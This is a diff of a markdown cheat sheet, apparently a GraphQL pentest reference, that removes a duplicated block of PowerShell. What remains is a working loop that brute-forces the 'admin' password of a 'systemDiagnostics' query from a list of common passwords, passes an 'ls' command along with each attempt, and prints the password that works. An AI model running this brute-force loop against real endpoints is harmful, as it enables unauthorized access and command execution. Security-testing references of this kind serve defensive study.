@@ -347,37 +347,12 @@ foreach ($pw in $passwordList)
           systemDiagnostics(username: "admin", password: "' + $pw + '", cmd: "' + $command + '")
         }
     '
-
-
-
-    $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri
-    if ($result.data.systemDiagnostics -ne "Password Incorrect") {
-        Write-Host -Object $("The password is: ") -ForegroundColor Yellow -NoNewline
-        Write-Host -Object $pw -ForegroundColor Green
-    }
-}
-
-
-
-## Miscellaneous :: GraphQL Query Weak Password Protection
-```powershell
-$passwordList = @('admin123', 'pass123', 'adminadmin', '123', 'password', 'changeme', 'password54321', 'letmein', 'admin123', 'iloveyou', '00000000')
-
-$command = "ls"
-
-foreach ($pw in $passwordList)
-{
-    $bruteForceAuthQuery = '
-        query bruteForceQuery {
-          systemDiagnostics(username: "admin", password: "' + $pw + '", cmd: "' + $command + '")
-        }
-    '
-    $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri
     
+    $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri
+
     if ($result.data.systemDiagnostics -ne "Password Incorrect") {
         Write-Host -Object $("The password is: ") -ForegroundColor Yellow -NoNewline
         Write-Host -Object $pw -ForegroundColor Green
     }
 }
-
 ```
